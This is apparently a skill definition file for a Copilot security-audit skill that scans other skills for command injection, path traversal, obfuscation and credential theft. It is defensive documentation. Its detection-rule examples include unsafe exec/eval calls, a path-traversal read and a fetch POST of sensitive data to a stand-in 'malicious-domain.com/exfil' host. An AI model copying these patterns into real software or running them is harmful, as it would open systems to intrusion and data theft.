---
name: security-audit-skills
description: Detect malicious code in skills and halt on critical threats. Use for "audit skills", "check skill security", "scan for malicious code", or before installing untrusted skills.
---

# Security Audit Skills

This skill performs comprehensive security audits on GitHub Copilot skills to detect potentially malicious code patterns and security vulnerabilities.

## Purpose

The security-audit-skills tool is designed to:
- Detect malicious code patterns in skill files
- Identify security vulnerabilities before skill installation
- Halt execution when critical threats are detected
- Provide actionable security recommendations

## When to Use

Use this skill when you need to:
- Audit skills before installation
- Check skill security for untrusted sources
- Scan for malicious code patterns
- Verify the safety of third-party skills
- Perform security reviews of skill modifications

## Security Patterns Detected

### Critical Threats (Immediate Halt)

1. **Command Injection**
   - Unescaped user input in shell commands
   - Direct execution of external input
   - Dangerous use of `eval()`, `exec()`, or similar functions

2. **File System Attacks**
   - Path traversal attempts (e.g., `../../../etc/passwd`)
   - Unauthorized file deletion or modification
   - Access to sensitive system files

3. **Network Exploits**
   - Unauthorized outbound connections to suspicious domains
   - Data exfiltration attempts
   - Command and control (C2) communication patterns

4. **Code Obfuscation**
   - Base64 encoded malicious payloads
   - Heavily obfuscated code segments
   - Hidden or encrypted command execution

5. **Credential Theft**
   - Attempts to access environment variables containing secrets
   - Reading of `.env`, credential files, or key stores
   - Token or API key exfiltration

### Warning-Level Issues

1. **Insecure Practices**
   - Use of deprecated or vulnerable functions
   - Insufficient input validation
   - Missing error handling for security-critical operations

2. **Suspicious Patterns**
   - Dynamic code generation from external sources
   - Unusual file access patterns
   - Excessive permission requests

3. **Privacy Concerns**
   - Collection of unnecessary user data
   - Transmission of data without encryption
   - Insufficient data sanitization

## How It Works

The security audit follows this process:

1. **Parse Skill File**: Extract and analyze skill metadata, code blocks, and instructions
2. **Pattern Matching**: Scan for known malicious patterns and security vulnerabilities
3. **Risk Assessment**: Categorize findings by severity (Critical, High, Medium, Low)
4. **Threat Detection**: Identify specific threat types and attack vectors
5. **Report Generation**: Provide detailed security findings with remediation steps
6. **Decision**: Halt installation for critical threats or warn for lower-severity issues

## Usage Examples

### Basic Security Audit
```
@workspace /skills audit security-audit-skills
```

### Pre-Installation Check
```
Before installing the new-skill, check its security with security-audit-skills
```

### Scan for Malicious Code
```
Scan the custom-skill.md file for malicious code using security-audit-skills
```

### Security Review
```
Use security-audit-skills to perform a security review of all skills in the repository
```

## Detection Rules

### Critical: Command Injection
```javascript
// DETECTED: Unsafe command execution
const result = exec(userInput);
eval(externalData);
Function(untrustedCode)();
```

### Critical: Path Traversal
```javascript
// DETECTED: Path traversal vulnerability
fs.readFile('../../../' + userPath);
require(userInput);
```

### Critical: Data Exfiltration
```javascript
// DETECTED: Suspicious network activity
fetch('http://malicious-domain.com/exfil', {
  method: 'POST',
  body: sensitiveData
});
```

### Warning: Insecure Randomness
```javascript
// DETECTED: Weak random number generation
Math.random(); // for security-critical operations
```

## Security Recommendations

When a threat is detected, the skill provides:

1. **Severity Level**: Critical, High, Medium, or Low
2. **Threat Type**: Category of the security issue
3. **Location**: File and line number where the issue was found
4. **Description**: Detailed explanation of the vulnerability
5. **Remediation**: Specific steps to fix the issue
6. **References**: Links to security best practices and documentation

## Response Actions

### For Critical Threats
- **HALT**: Immediately stop skill installation
- **ALERT**: Display prominent security warning
- **BLOCK**: Prevent skill execution until issues are resolved

### For High-Priority Issues
- **WARN**: Display security warnings
- **RECOMMEND**: Suggest immediate fixes
- **LOG**: Record the security finding for review

### For Medium/Low Issues
- **NOTIFY**: Inform user of potential concerns
- **SUGGEST**: Provide improvement recommendations
- **DOCUMENT**: Add to security audit log

## Skill Metadata Validation

The skill also validates:
- Skill metadata completeness and accuracy
- Permission declarations
- Dependency safety
- Version compatibility
- Digital signatures (if available)

## Integration with CI/CD

This skill can be integrated into CI/CD pipelines:

```yaml
- name: Security Audit Skills
  run: |
    # Scan all skill files for security issues
    copilot audit --skill security-audit-skills --path .github/skills/
```

## Limitations

- Pattern-based detection may have false positives
- Cannot detect all sophisticated obfuscation techniques
- Requires regular updates for new threat patterns
- May not catch zero-day exploits

## Updating Threat Patterns

To maintain effectiveness, this skill should be regularly updated with:
- New malicious code patterns
- Emerging attack vectors
- Updated vulnerability databases
- Community-reported threats

## Contributing

To contribute new detection patterns:
1. Identify a new malicious pattern
2. Create a test case
3. Add detection logic
4. Document the pattern and remediation
5. Submit for review

## Support

For questions or issues:
- Review the security documentation
- Check for similar issues in the repository
- Report false positives or missed detections
- Suggest improvements to detection patterns

## License

This skill follows the same license as the parent repository.

---

**Remember**: Security is an ongoing process. Regularly audit your skills and keep detection patterns up to date.
